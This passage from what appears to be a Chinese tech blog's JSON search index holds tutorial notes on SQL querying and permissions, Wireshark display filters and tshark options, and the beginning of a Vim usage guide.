\u0026lt;=MAX \u0026lt;=ALL 小于等于子查询结果中的所有值 \u0026lt;=MIN =ANY 等于子查询结果中的某个值 IN =ALL 等于子查询结果中的所有值（通常无实际意义） \u0026ndash; !=(或\u0026lt;\u0026gt;)ANY 不等于子查询结果中的某个值 \u0026ndash; !=(或\u0026lt;\u0026gt;)ALL 不等于子查询结果中的任何值 NOT IN eg.查询TAB1里面三年级学生学号大于23000的：\nSELECT Ch FROM STUDY.TAB1 WHERE Nu\u0026gt;=ANY (SELECT Nu FROM STUDY.\u0026#34;tab1\u0026#34; WHERE Grade=3 ); EXISTS子查询 EXISTS代表存在量词，对应的为NOT EXISTS\nEXISTS谓词的子查询不返回数据，只返回逻辑\u0026rsquo;true\u0026rsquo;和\u0026rsquo;false\u0026rsquo;\neg1.在SC表中查询至少选修了1号学生选修的全部课程（Cno）的学生的学号（Sno)\n查询学号为 x 的学生，对所有的课程 y，只要 1 号学生选修了课程 y，则 x 也选修了 y。\n令 p 表示\u0026quot;学生 1 号选修了课程 y\u0026quot;\n令 q 表示\u0026quot;学生 x 选修了课程 y\u0026quot;\n则上述查询可以表示为(∀y)p→q\n通过等价转换，可得(∀y)p→q ≡ ¬(∃y(¬(p→q))) ≡ ¬(∃y(¬(¬p∨q))) ≡ ¬∃y(p∧¬q)\n最终用 SQL 实现的表达式 ¬∃y(p∧¬q)，语义：不存在这样的课程 y，学生 1 号选修了 y，而学生 x 没有选修\nSELECT DISTINCT Sno FROM SC SCX WHERE NOT EXISTS (SELECT * -- 由EXISTS引I出的子查询，其目标列表达式通常都用* FROM SC SCY WHERE SCY.Sno=\u0026#39;1\u0026#39; AND NOT EXISTS (SELECT * FROM SC SCZ WHERE SCZ.Sno = SCX.Sno AND SCZ.Cno = SCY.Cno) -- 保证内外指向相同的学生 ); eg2.基于 SC 表，查询选修了全部课程（Course 表）的学生姓名（Student 表）\n令 p 表示\u0026quot;课程 x 被学生 y 选修了\u0026quot;，则有(∀x)p ≡ ¬(∃x(¬p))，语义：查询没有任何课程是其不选修的学生 y\nSELECT Sname FROM Student WHERE NOT EXISTS (SELECT * FROM Course WHERE NOT EXISTS (SELECT * FROM SC WHERE Sno=Student.Sno AND Cno=Course.Cno) ); 集合查询 多个SELECT语句的结果可以进行集合的并（UNION)、交（INTERSECT)、差（EXCEPT） 参加集合操作的各查询结果的列数必须相同，对应项的数据类型也必须相同\nUNION并操作（满足前者或满足后者） UNION合并查询结果时，系统会自动去掉重复元组，若需保留，则采用UNIONALL\neg.在TAB2中查询学号大于等于23003的学生和选择了MATH科目的学生\nSELECT * FROM STUDY.TAB2 WHERE Nu\u0026gt;=23003 UNION SELECT * FROM STUDY.TAB2 WHERE CLA=\u0026#39;MATH\u0026#39; OR CLA2=\u0026#39;MATH\u0026#39;; INTERSECT交操作（前后都满足） eg.在TAB2中查询选了MATH又选了history的学生\nSELECT * FROM STUDY.TAB2 WHERE CLA=\u0026#39;history\u0026#39; OR CLA2=\u0026#39;history\u0026#39; INTERSECT SELECT * FROM STUDY.TAB2 WHERE CLA=\u0026#39;MATH\u0026#39; OR CLA2=\u0026#39;MATH\u0026#39;; EXCEPT差操作（满足前者，不满足后者） eg.在TAB2中查询学号大于23002的学生和选修了MATH的学生的差集\nSELECT * FROM STUDY.TAB2 WHERE Nu\u0026gt;23002 EXCEPT SELECT * FROM STUDY.TAB2 WHERE CLA=\u0026#39;MATH\u0026#39; OR CLA2=\u0026#39;MATH\u0026#39;; 基于派生表的查询 子查询出现在FROM子句时，子查询将生成临时的派生表，成为主查询的查询对象\nFROM (子查询) AS 别名 (属性列名1,属性列名2)\n如果子查询中没有聚集函数，派生表可以不指定属性列，子查询SELECT子句后面的列名为其默认属性 AS可以省略，但必须为派生表关系指定一个别名\neg1.找出每个学生超过他自己选修课程平均成绩的课程号\nSELECT Sno, Cno FROM SC, (SELECT Sno, Avg(Grade) FROM SC GROUP BY Sno ) AS Avg_sc(avg_sno, avg_grade) WHERE SC.Sno = Avg_sc.avg_sno AND SC.Grade\u0026gt; =Avg_sc.avg_grade; eg2.查询所有选修了1号课程的学生姓名\nSELECT Sname FROM Student, (SELECT Sno FROM SC WHERE Cno=\u0026#39;1\u0026#39; ) AS SC1 WHERE Student.Sno=SC1.Sno; 插入数据\u0026ndash;INSERT语句 插入元组 一般格式 INSERT\nINTO 表名(列名1,列名n)\nVALUES(常量1,常量n); //字符串常量要用单引号\u0026rsquo;\u0026lsquo;括起来\n假设现在有TAB1表，有C1到C4四列，其中C4列是字符串常量： 情况1：明确给出新增元组要在哪些属性上赋值（插入数据包含全部属性列） INSERT INTO TAB1(C1,C2,C3,C4) VALUES(1,2,3,\u0026#39;4\u0026#39;); 情况2：明确给出新增元组要在哪些属性上赋值（插入数据只包含部分属性列） INSERT INTO TAB1(C1,C2,C3) VALUES(1,2,3) 这种情况下C4列会被赋值NULL，如果C4有约束条件NOT NULL则会报错\n情况3：仅指出要在TAB1表上插入元组（插入数据包含全部属性列） INSERT INTO TAB1 VALUES(1,2,3\u0026#39;4\u0026#39;); 这种情况表示要在全部属性列上赋值，插入数据顺序必须和列的顺序对应\n情况4：仅指出要在TAB1表上插入元组（插入数据只包含部分属性列） INSERT INTO TAB1 VALUES(1,2,3,NULL); 这种情况必须明确未赋值的属性列为NULL\n插入子查询结果 一般格式 INSERT\nINTO TAB1(属性列1,属性列2)\n子查询;\neg.假设现有TAB1表（如上），并按C1列分组求C2列的平均值，并存入TAB2表（其中TAB2表的C1列存放 C1，avg_C2列存放C2列的均值)\nINSERT INTO TAB2 (C1, avg_C2) SELECT C1, AVG(C2) FROMTAB1 GROUP BY C1; 修改数据\u0026ndash;UPDATE语句 一般格式 UPDATE 表名\n==SET 列名1=表达式1,列名n=表达式n\nWHERE 条件;==\nWHERE语句若省略，则表示修改表中所有元组\n情况1：修改某一个元组的值 UPDATE TAB1 SET C4=\u0026#39;0\u0026#39; WHERE C1=1; 情况2：修改多个元组的值 UPDATE TAB1 SET C3=C3+1; 情况3：带子查询的修改语句 UPDATE TAB1 SET C4=\u0026#39;0\u0026#39; WHERE C1 IN (SELECT C1 FROM TAB2 WHERE avg_C2=2 ); 删除语句\u0026ndash;DELETE语句 一般格式 DELETE\nFROM 表名\nWHERE 条件;\nWHERE语句若省略，则表示删除表中所有元组\n情况1：删除某一个元组的值 DELETE FROM TAB1 WHERE C1=1; 情况2：修改多个元组的值 DELETE FROM TAB1 情况3：带子查询的修改语句 DELETE FROM TAB1 WHERE C1 IN (SELECT C1 FROM TAB2 WHERE avg_C2=2 ); VIEW 视图 建立视图 一般格式 CREATE VIEW 视图名 (列名1,列名n)\nAS 子查询\nWITH CHECK OPTION;\n若省略视图名后的列名，则该视图由子查询中SELECT的目标列字段组成\n若添加WITH句，则表示对视图进行增删改时要满足子查询中的条件表达式\n在以下情况中必须明确指定组成视图的列名： 1.某个目标列不是单纯的列名，而是聚集函数或列表达式 2.多表连接时选出了几个同名列作为视图的字段 3.需要在视图中为某个列启用新的更合适的名字\n行列子集视图：由单个基本表导出，仅去掉了基本表的某些行和某些列，但保留了主码\n若某些视图是建立在另一个表的全部属性列上的（视图与基本表的各列是一一对应的）那么当修改基本表的结构时，基本表和视图的映像关系会被破坏。这种情况最好在修改基本表后删除该视图，然后重建该视图\n情况1：建立完全视图 eg1.建立C1为1时TAB1的视图\nCREATE VIEW V_TAB1 AS SELECT C1,C2,C3,C4 FROM TAB1 WHERE C1=1; 情况2：建立带有增删改条件的视图 eg2.建立C4为4时TAB1的视图，并且以后每次增删改时都要满足C4=4\nCREATE VIEW V_TAB2 AS SELECT C1,C2,C3,C4 FROM TAB1 WHERE C4=\u0026#39;4\u0026#39; WITH CHECK OPTION; 情况3：由视图新建视图 eg3.建立在一个或多个已定义的视图上\nCREATE VIEW V_TAB3 AS SELECT C1,C2,C3 FROM V_TAB1 WHERE C2=2; 情况4：带有派生数据的视图 减少冗余数据，定义基本表时一般只存放基本数据。当需要使用计算得出的派生数据时，可以设置在视图 中的派生属性列上，也称为虚拟列。带虚拟列的视图也称为带表达式的视图\neg4.建立有派生数据的视图\nCREATE VIEW V_TAB4(C1,new_C2) AS SELECT C1,10+C2 FROM TAB1; 情况5：带有聚集函数和GROUP BY的分组视图 eg5.建立包含聚集函数的分组视图\nCREATE VIEW V_TAB5(C1,avg_C2) AS SELECT C1,AVG(C2) FROM TAB1; GROUP BY C1; 删除视图 DROP VIEW 视图名 CASCADE;\n如果使用了CASCADE级联删除语句，则将把该视图导出的所有视图一并删除\n查询和更新视图 视图定义后，对视图进行查询和更新的语句和语法与基本表相同 视图的查询与更新最终都会转换为对基本表的查询和更新，这一过程也被称为视图消解 一般来说，行列子集视图的查询和更新都可以顺利转换，其他则不一定\n空值 判断属性为空值 这部分和WHERE语句里面空值判断一样啦\n属性 IS NULL;\n属性 IS NOT NULL;\neg.查找TAB1中名字为空的学生：\nSELECT * FROM STUDY.TAB1 WHERE Ch IS NULL; 空值的运算 算数运算 空值与另一个值的算术运算结果为空值\nSELECT 5 + NULL; -- 结果为 NULL SELECT 10 / NULL; -- 结果为 NULL 比较运算 空值与另一个值的比较运算结果为 UNKNOWN\nSELECT 5 = NULL; -- 结果为 UNKNOWN SELECT 5 \u0026lt;\u0026gt; NULL; -- 结果为 UNKNOWN SELECT 5 \u0026gt; NULL; -- 结果为 UNKNOWN 在查询语句中的处理 在查询语句中，只有使WHERE和HAVING子句的选择条件为TRUE的元组才会被选出作为输出结果（即不包括UNKNOWN的情况)\neg1:\nSELECT * FROM employees WHERE salary \u0026gt; 50000 AND commission IS NOT NULL; 这个查询会返回所有工资大于 50000 且佣金不为 NULL 的员工记录\neg2:\nSELECT * FROM employees WHERE commission \u0026lt;\u0026gt; 0; 查询过程中commission可能为NULL，这部分运算后产生UNKNOWN，对应元组会被忽略\n要让所有都能被输出，最好做如下改动：\nSELECT * FROM employees WHERE commission \u0026lt;\u0026gt; 0 OR commission IS NULL; 数据库安全 授权 授予用户权限 GRANT 权限 ON 对象类型 对象名 TO 用户名 [WITH GRANT OPTION];\n权限：查询权限 SELECT，全部操作权限 ALL PRIVILEGES\n对象类型：TABLE/VIEW\n对象名：表和视图的名称\n用户名：可以指定用户，也可以全体用户PUBLIC\n如果没有WITH GRANT OPTION语句，那么用户不能传播这个权限\nSQL不允许循环授权，被授权者不能把权限传递给授权者或其祖先\neg.假设我们有一个名为employees的表，现在想让用户user_A只能查询这张表\nGRANT SELECT ON TABLE employees TO user_A; 如果要让A还能把权限授权给别人：\nGRANT SELECT ON TABLE employees TO user_A WITH GRANT OPTION; 收回用户权限 REVOKE 权限 ON 对象类型 对象名 FROM 用户名 [CASCADE/RESTRICT];\nCASCADE：级联回收，把用户传播出去的权限一并收回\nRESTRICT：受限回收，如果用户传播过该权限，回收会失败（默认行为）\neg.收回user_A的权限\nREVOKE SELECT ON TABLE employees FROM user_A; 创建数据库模式的权限 对创建数据库模式一类的数据库对象的授权在数据库管理员创建用户的时候实现\nCREATE USER 用户名 [WITH DBA|RESOURCE|CONNECT];\nDBA：可以创建新用户、模式、表、视图等，还可以把这些权限授予其他用户\nRESOURCE：可以创建表、视图，但是不能创建新的模式和用户\nCONNECT：只能登录数据库，或者被授予权限后操作\n数据库角色 角色是权限的集合，可以为一组相同权限的用户创建同一个角色，使用角色管理权限，简化授权过程\n创建角色 CREATE ROLE 角色名;\n给角色添加角色/用户 GRANT 角色 TO 某角色/某用户 [WITH ADMIN OPTION];\n给角色授权 GRANT 权限 ON 对象类型 对象名 TO 角色；\n收回角色权限 REVOKE 权限 ON 对象类型 对象名 FROM 角色;\n","date":"2025-06-03T01:14:02+08:00","image":"http://picture.928330.xyz/typora/SQL-logo.png","permalink":"https://blog.928330.xyz/p/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8sql/","title":"快速入门SQL"},{"content":"wireshark过滤语法 运算符 比较运算符 操作符 别名 类C风格 描述 示例 eq any_eq == 等于 ip.src == 10.0.0.5 ne all_ne != 不等于 ip.src != 10.0.0.5 all_eq === 全等 ip.src === 10.0.0.5 any_ne !== 不全等 ip.src !== 10.0.0.5 gt \u0026gt; 大于 frame.len \u0026gt; 10 lt \u0026lt; 小于 frame.len \u0026lt; 128 ge \u0026gt;= 大于或等于 frame.len ge 0x100 le \u0026lt;= 小于或等于 frame.len \u0026lt;= 0x20 contains 协议、字段或切片包含某个值 sip.To contains \u0026ldquo;a1762\u0026rdquo; matches ~ 右侧的正则表达式将被用来匹配左侧的字符串 http.host matches \u0026ldquo;acme.(org|com|net)\u0026rdquo; 等于（==）和全等（===）的区别：\n== 是一种宽松的比较，只要有一个值匹配即可（any if more than one）\n=== 是一种严格的比较，所有可能的值都必须匹配（all if more than one）\n同一个包，使用等于（==）可以过滤出源或目的端口为80报文，使用全等（===）则会匹配源目的端口都为80的报文\nip.addr == 10.0.0.0/8 等价于 ip.src==10.0.0.0/8 || ip.dst==10.0.0.0/8 ip.addr === 10.0.0.0/8 等价于 ip.src==10.0.0.0/8 \u0026amp;\u0026amp; ip.dst==10.0.0.0/8 逻辑运算符 操作符 类C风格 描述 示例 and \u0026amp;\u0026amp; 逻辑与 ip.src == 10.0.0.5 and tcp.flags.fin == 1 or || 逻辑或 ip.src == 10.0.0.5 or ip.src == 192.1.1.1 xor ^^ 逻辑异或，能且只能满足其中一个 tr.dst[0:3] == 0.6.29 xor tr.src[0:3] == 0.6.29 not ! 逻辑非 ! udp […] 不涉及 [a:b]：从第a个字符开始取b个字符 http.request.method**[0:3]**==\u0026ldquo;GET\u0026rdquo; in 不涉及 匹配集合内的元素，代替== http.request.method in {\u0026ldquo;HEAD\u0026rdquo;, \u0026ldquo;GET\u0026rdquo;} 函数 函数 描述 upper 将字符串字段转换为大写 lower 将字符串字段转换为小写 len 返回字符串字段或字节字段的字节长度 count 返回帧中字段的出现次数 string 将非字符串字段转换为字符串 vals 将字段值转换为其值字符串（如果有） dec 将无符号整数字段转换为十进制字符串 hex 将无符号整数字段转换为十六进制字符串 max 返回参数的最大值 min 返回参数的最小值 abs 返回参数的绝对值 upper()、lower() 可以使用这两个函数，将字符串转化为大小写，再进行正则匹配，做到不区分大小写的功能\nlower(http.server) ~ \u0026#34;apache\u0026#34; //过滤HTTP响应头的server字段为apache的 upper(http.request.method) ~ \u0026#34;post|get\u0026#34; //过滤http请求方法为POST或GET len() len()函数将返回字段的字节大小，因此可以和比较操作符配合使用，过滤某个报文字段符合大小要求的报文\nlen(http.request.uri) \u0026gt;= 10 //过滤http头部的URI字段，大于等于10字节的报文 len(http.host) \u0026gt;= 20 //过滤HTTP主机名大于等于20字节的报文 string() 当字段为非字符串类型，而又想转换为字符串字段再进行正则匹配时，很方便\nstring(ip.addr) ~ \u0026#34;^10|^11\u0026#34; //过滤IP为10网段开头或者23网段开头的IP string(ip.dst) matches r\u0026#34;^172\\.(1[6-9]|2[0-9]|3[0-1])\\.[0-9]{1,3}\\.255\u0026#34; //匹配目的IP中以255结尾的IP地址(172.16到172.31) max()、min() max()和min()接受相同类型的任意数量的参数，并分别返回集合中最大/最小的参数\nmax(tcp.srcport,tcp.dstport) \u0026lt;= 1024 //过滤tcp源端口、目的端口，最大不能超过1024的报文 min(tcp.srcport+tcp.dstport) \u0026gt;= 1024 //过滤tcp源端口+目的端口大于等于1024的报文 过滤IP 1）源地址为192.168.0.1的包\nip.src == 192.168.0.1 2）目的地址为192.168.0.1的包\nip.dst == 192.168.0.1 3）源地址或目的地址是192.168.0.1的包\nip.addr == 192.168.0.1 要原地址和目标地址一样就用===\n4）排除上述包\n!(表达式) 过滤协议 1）仅捕获某种协议的包\n直接写协议名即可，如http（区分大小写）\n2）捕获多种协议的包\n使用逻辑或\nhttp or telent 3）排除某种协议的包\n使用逻辑非\nnot http ! http 过滤端口（需要指明协议） 1）捕获某一端口的包\ntcp.port == 80 2）捕获多端口的包\n可以用and来表示多端口并列\ntcp.port == 80 and 8080 也可以用比较运算符\nudp.port \u0026gt;= 2048 过滤长度、内容 1）长度（数据段的长度）\nudp.length \u0026gt;= 30 //udp的payload长度 http.content_length \u0026lt;= 20 //http消息体长度 2）数据包内容\n使用matches/contains\n过滤时间 frame.time \u0026gt;= \u0026#34;Apr 16, 2021 06:00:00.0\u0026#34; \u0026amp;\u0026amp; frame.time \u0026lt;= \u0026#34;Apr 16, 2021 06:59:00.0\u0026#34; frame.time \u0026gt; \u0026#34;2024-04-11 11:00:00\u0026#34; and frame.time \u0026lt; \u0026#34;2024-04-11 11:01:00\u0026#34; 注意：时间是字符串，要用双引号括起来\ntshark基本命令 -r \u0026ndash; 从一个已有的捕获文件读取数据包进行分析 **-r 111.pcap：**从名为 111.pcap 的文件中读取数据包并简略打印出来\neg:\n1.837951 192.168.1.12 -\u0026gt;192.168.1.5 TCP 72 8080 -\u0026gt; 45940 [FIN, ACK] Seq=1 ... ​ 时间戳 原IP 目标IP 协议 数据包长度 源端口 目标端口 报文标头信息\n-n/-N \u0026ndash; 禁止反向解析 -n \u0026ndash; 禁用域名解析，不对 IP 地址和端口号进行名称解析 默认情况下，tshark 会尝试将捕获到的 IP 地址解析为主机名（192.168.1.1-\u0026gt;exaple.com），同时也会将端口号转换为服务名称（如 80 变成 http，443 变成 https 等）\n通过使用 -n 参数，可以避免这些解析，直接显示原始的 IP 地址和端口号\neg:\ntshark -r file.pcap //直接输出 192.168.1.1 -\u0026gt; example.com 80 tshark -n -r file.pcap //-n输出 192.168.1.1 -\u0026gt; 93.184.216.34 80 -N \u0026ndash; 精准控制解析哪些层级 格式：-N \u0026lt;反向解析flag1\u0026gt; -N \u0026lt;反向解析flag2\u0026gt;\u0026hellip;\nflag取值 含义 d 对于DNS包启用解析 m 启用MAC地址解析 n 启用网络地址解析 N 使用外部解析器（例如DNS）进行网络地址解析，n需要被同时启用才有效果 t 启用传输层端口解析 v 启用VLAN ID的名称解析 eg：\ntshark -r file.pcap //直接输出 1.837951 192.168.1.12 -\u0026gt; 192.168.1.5 TCP 72 45940 -\u0026gt; 80 [FIN, ACK] Seq=1 Ack=2 ... tshark -N t -r file.pcap //-N t(解析传输层端口)输出 1.837951 192.168.1.12 -\u0026gt; 192.168.1.5 TCP 72 45940 -\u0026gt;(http)80 [FIN, ACK] Seq=1 Ack=2 ... ↑ -T \u0026ndash; 指定输出格式 **-T fields：**仅输出指定的字段（需配合 -e 使用）\n**-T text：**以普通文本格式输出（默认）\n**-T json：**以 JSON 格式输出\n**-T jsonraw：**以 JSON（包含原始数据）格式输出\n**-T ek：**以 ElasticSearch 格式输出\n-e \u0026ndash; 指定显示数据包中的特定字段 格式：-e \u0026ldquo;字段1\u0026rdquo; -e \u0026ldquo;字段2\u0026rdquo;\u0026hellip;\n**ip.src：**显示源 IP 地址\n**ip.dst：**显示目标 IP 地址\n**http.host：**显示 HTTP 请求中的主机名\n**http.request.uri：**显示 HTTP 请求中的 URI（即请求的 URL 路径）\n**usbhid.data：**只提取USB HID 设备数据\n**frame.number：**显示数据包的报文帧数\n**frame.time：**显示数据包捕获的时间戳\n**frame.len：**显示数据包的长度\neg:\ntshark -n -r file.pcap -e \u0026#34;frame.number\u0026#34; -e \u0026#34;ip.addr\u0026#34; -e \u0026#34;tcp.port\u0026#34; -e tcp -T fields //输出报文帧数、ip地址、端口、tcp协议的字段 1 192.168.1.12,192.168.1.8 37546,80 Transmission Control Protocol,SrcPort: ... 报文帧数 ip地址 端口 tcp协议的字段 -Y \u0026ndash; 筛选过滤报文 格式：-Y \u0026ldquo;过滤条件\u0026rdquo;\n用来过滤分析符合过滤表达式的报文，相当于wireshark最上面的过滤筛选栏功能\neg:\ntshark -n -r \u0026lt;filename\u0026gt; -Y \u0026#34;http.host == \u0026#34;web-server1\u0026#34;\u0026#34; //通过http.host过滤 tshark -n -r http-keep-alive.pcap -Y \u0026#34;tcp.flags.syn==1\u0026amp;\u0026amp;tcp.flags.ack==0\u0026#34; //过滤第一次握手的请求 -E \u0026ndash; 设置输出的控制字段 通过-T参数来输出特定格式时，可以配合-E参数来设置一些选项\n参数选项 默认 含义 bom=y|n n 在输出前加上UTF-8字节顺序标记（十六进制ef、bb、bf） header=y|n n 打印一个使用-e作为输出第一行的字段名称头部 separator=/t|/s|\u0026lt;character\u0026gt; /t 设置字段分隔符，默认为/t，可以指定/s，即单个空格，或者自定义的其它字符 occurrence=f|l|a a 打印每个字段的第一次(f)/最后一次(l)/或所有出现的内容(a) aggregator=,|/s|\u0026lt;character\u0026gt; , 设置用于每个字段内的分割字符 quote=d|s|n n 设置用于环绕字段的引号字符 n是null，无设置\neg:\ntshark -n -r file.pcap -E header=y -E occurrence=l -Y \u0026#39;icmp.seq==21\u0026#39; -e \u0026#39;icmp.seq\u0026#39; ... -T fields |column -t // -E occurrence=l：包通过IPIP封装，occurrence=l指定输出外层IP // -Y \u0026#39;icmp.seq==21\u0026#39;：指定icmp.seq等于21的ICMP包 // | column -t：将输出通过管道传输给 column 命令，使结果以表格的形式对齐 icmp.seq ip.src ip.dst ip 21 114.132.116.32 113.145.123.23 Internet Protocol Version 4，Src:，Dst: -2 \u0026ndash; 二次依赖分析 没有2以外的参数\ntshark会根据上下文报文的依赖关系（tshark称之为two-pass，即进行两次分析），来显示相关报文关联信息，如：response in frame #、reply in frame、TCP Port numbers reused\n-i \u0026ndash; 指定要捕获数据的网络接口 **-i eth0：**表示从 eth0 网络接口捕获数据包\n**-i wlan0：**表示从无线网卡 wlan0 捕获数据包\n**-i any：**表示捕获所有接口的流量\n**-：**表示从标准输入（stdin）捕获数据流\n-f \u0026ndash; 应用捕获过滤器，只捕获特定的流量 **-f \u0026quot;tcp\u0026quot;：**只捕获 TCP 流量\n**-f \u0026quot;port 80\u0026quot;：**只捕获端口为 80（HTTP）的流量\n**-f \u0026quot;src host 192.168.1.1\u0026quot;：**只捕获源地址为 192.168.1.1 的流量\n-w \u0026ndash; 将捕获的数据包写入到文件中 **-w output.pcap：**将捕获的数据包保存到 output.pcap 文件\n**-：**将捕获的内容输出到标准输出（stdout）\noptions \u0026ndash; 其他可选参数 **-V：**显示详细的包信息\n**-c \u0026lt;count\u0026gt;：**捕获指定数量的包后停止\n**-n：**禁止域名解析，使用 IP 地址而不是主机名显示\n\u0026lt;filter\u0026gt; 指定显示过滤器 如果要用过滤器，一定要放到最后\n**ip.addr == 192.168.1.1：**仅显示源或目标地址为 192.168.1.1 的包。\n**tcp.port == 443：**仅显示端口为 443 的 TCP 数据包（通常用于 HTTPS 流量）。\n**http：**仅显示 HTTP 协议的数据包\n","date":"2025-05-14T01:15:30+08:00","image":"http://picture.928330.xyz/typora/wireshark-for-cybersecurity.jpg","permalink":"https://blog.928330.xyz/p/wiresharktshark%E7%AE%80%E6%98%93%E6%8C%87%E5%8C%97/","title":"wireshark\u0026tshark简易指北"},{"content":"VIM使用方式 vim键盘图 vim操作文件基本方式 打开文件 单个文件\nvim file1 多个文件\nvim file1 file2 ... filen 该方式打开文件，显示屏默认显示第一个文件也就是 file1\n文件之间的切换 :ls \u0026ndash; 列出 VIM 打开的所有文件 :bn \u0026ndash; 显示屏上显示第n个文件 显示多个文件 左右分屏\nvim -On file1 file2 ... filen 这里的 n 是代表有几个文件需要分屏，从左至右依次显示 n 个文件\n上下分屏\nvim -on file1 file2 ... filen 跟上一个命令不同的是 -on 中的 o 是小写，这样将会上下依次显示 n 个文件\n分屏操作（ctrl+w系列） 左右分屏 Ctrl+w+s \u0026ndash; 上下分割当前打开的文件 :sp file \u0026ndash; 上下分割当前文件和新打开的 file 上下分屏 Ctrl+w+v \u0026ndash; 左右分割当前打开的文件 :vsp file \u0026ndash; 左右分割当前文件和新打开的 file 移动分屏 大写字母\nCtrl+w+H \u0026ndash; 将当前的分屏移动到左边 Ctrl+w+L \u0026ndash; 将当前的分屏移动到右边 Ctrl+w+J \u0026ndash; 将当前的分屏移动到上边 Ctrl+w+K \u0026ndash; 将当前的分屏移动到下边 在文件间切换光标 小写字母\nCtrl+w+h \u0026ndash; 将当前光标定位到左边的屏幕 Ctrl+w+l \u0026ndash; 将当前光标定位到左边的屏幕 Ctrl+w+j \u0026ndash; 将当前光标定位到左边的屏幕 Ctrl+w+k \u0026ndash; 将当前光标定位到左边的屏幕 关闭分屏 Ctrl+w+c \u0026ndash; 关闭当前的分屏(多个分屏就只关闭光标所在的分屏) Ctrl+w+q \u0026ndash; 关闭当前的分屏，如果是最后一个分屏将会退出 VIM vim五大模式 普通模式 用户刚刚启动 vi/vim，便进入了普通模式\n此状态下敲击键盘动作会被 Vim 识别为命令，而非输入字符\n普通模式移动光标 快速移动光标\n输入[数字n＋方向]，代表向某个方向移动n\nh / ← / [backspace]：向左移动光标 j / ↓：向下移动光标 k / ↑：向上移动光标 l / → / [space]：向右移动光标 在当前行上移动光标\n0 或功能键[Home] \u0026ndash; 移动到行头 ^ \u0026ndash; 移动到本行的第一个不是 blank 字符 $ 或功能键[End] \u0026ndash; 移动到行尾 g_ \u0026ndash; 移动到本行最后一个不是 blank 字符的位置 w \u0026ndash; 光标移动到下一个单词的开头 e \u0026ndash; 光标移动到下一个单词的结尾 fa \u0026ndash; 移动到本行下一个为 a 的字符处 nfa \u0026ndash; 移动到本行光标处开始的第 n 个 字符为 a 的地方 Fa \u0026ndash; 同fa一样，光标移动方向同fa相反 nFa \u0026ndash; 同 nfa 类似，光标移动方向同 nfa相反 ta \u0026ndash; 移动光标至 a 字符的前一个字符 nta \u0026ndash; 移动到第n个 a 字符的前一个字符处 Ta \u0026ndash; 同ta移动光标方向相反 nTa \u0026ndash; 同 nta 移动光标方向相反 ; \u0026amp; , \u0026ndash; 当使用 f, F, t ,T, 关键字指定字符跳转的时候，使用**；可以快速跳转到下一个指定的字符，,** 是跳到前一个指定的字符 跨行移动光标\nnG \u0026ndash; 光标定位到第 n 行的行首 gg \u0026ndash; 光标定位到第一行的行首 G \u0026ndash; 光标定位到最后一行的行首 H \u0026ndash; 光标定位到当前屏幕的第一行行首 M \u0026ndash; 光标移动到当前屏幕的中间 L \u0026ndash; 光标移动到当前屏幕的尾部 zt \u0026ndash; 把当前行移动到当前屏幕的最上方，也就是第一行 zz \u0026ndash; 把当前行移动到当前屏幕的中间 zb \u0026ndash; 把当前行移动到当前屏幕的尾部 % \u0026ndash; 匹配括号移动，包括 ( , { , [ 需要把光标先移动到括号上 * \u0026amp; # \u0026ndash; 匹配光标当前所在的单词， ***** 是下一个，# 是上一个 翻页操作\nctrl+u \u0026ndash; 向上滚动半页 ctrl+b \u0026ndash; 向上滚动一页 ctrl+d \u0026ndash; 向下滚动半页 ctrl+f \u0026ndash; 向下滚动一页 普通模式操作文本 删除\nd 是删除的意思，通常搭配一个字符 ( 删除范围 ) 实现删除功能，常用的如下：\ndw \u0026ndash; 删除一个单词 dnw \u0026ndash; 删除 n 个单词， dfa \u0026ndash; 删除光标处到下一个 a 的字符处（ fa 定位光标到 a 处 ） dnfa \u0026ndash; 删除光标处到第 n 个 a 的字符处 dd \u0026ndash; 删除一整行 ndd \u0026ndash; 删除光标处开始的 n 行 d$ \u0026ndash; 删除光标到本行的结尾 d0 \u0026ndash; 删除游标所在处到该行的最前面一个字符 dH \u0026ndash; 删除屏幕显示的第一行文本到光标所在的行 d1G \u0026ndash; 删除光标所在到第一行的所有数据 dG \u0026ndash; 删除光标所在到最后一行的所有数据 x \u0026ndash; 删除光标当前所在的字符**(delete)** X \u0026ndash; 删除光标前面的一个字符**(backspace)** nx \u0026ndash; 向后连续删除n个字符 复制\ny 是复制的意思，通常搭配一个字符（复制范围）实现复制的功能，常用的如下：\nyw \u0026ndash; 复制一个单词，还有ynw yfa \u0026ndash; 复制光标到下一个 a 的字符处,还有ynfa yy \u0026ndash; 复制一行，还有nyy y$ \u0026ndash; 复制光标到本号的结尾 yH \u0026ndash; 复制屏幕显示的第一行文本到光标所在的行 y1G \u0026ndash; 复制光标所在行到第一行的所有数据 yG \u0026ndash; 复制光标所在行到最后一行的所有数据 粘贴\np是黏贴的意思，当执行完复制或者黏贴的命令以后，VIM 会把文本寄存起来\np(小写) \u0026ndash; 在光标后开始黏贴\nP(大写) \u0026ndash; 在光标前开始粘贴\n撤销操作和恢复\nu \u0026ndash; 撤销刚才的操作 ctrl+r \u0026ndash; 恢复撤销操作 大小写转换\n~ \u0026ndash; 将光标下的字母改变大小写 3~ \u0026ndash; 将光标位置开始的3个字母改变其大小写 g~~ \u0026ndash; 改变当前行字母的大小写 gUU \u0026ndash; 将当前行的字母改成大写 guu \u0026ndash; 将当前行的字母全改成小写 3gUU \u0026ndash; 将从光标开始到下面3行字母改成大写 gUw \u0026ndash; 将光标下的单词改成大写 guw \u0026ndash; 将光标下的单词改成小写 重复操作\n. \u0026ndash; 重复上一个操作的命令 n\u0026lt;command\u0026gt; \u0026ndash; 重复某个命令 n 次，如 10p复制 10 次，10dd 删除十次 其他\nJ \u0026ndash; 将光标所在行与下一行的数据结合成同一行 c \u0026ndash; 重复删除多个数据，例如向下删除 10 行，10cj 插入模式 进入插入模式 命令 说明 i, I i \u0026ndash; 从目前光标所在处输入\nI \u0026ndash; 在目前所在行的第一个非空格符处开始输入 a, A a \u0026ndash; 从目前光标所在的下一个字符处开始输入\nA \u0026ndash; 从光标所在行的最后一个字符处开始输入 o, O o \u0026ndash; 在目前光标所在的下一行处输入新的一行\nO \u0026ndash; 在目前光标所在的上一行处输入新的一行 s，S s \u0026ndash; 删除光标所在处的字符然后插入需要录入的文本\nS \u0026ndash; 删除光标所在行，在当前行的行首开始插入需要录入的文本 cw 删除从光标处开始到该单词结束的所有字符，然后插入需要录入的文本 插入模式的命令 必须知道的：#是vim中的注释符号\n在输入模式中，可以使用以下按键：\n字符按键以及Shift组合，输入字符 ENTER，回车键，换行 BACK 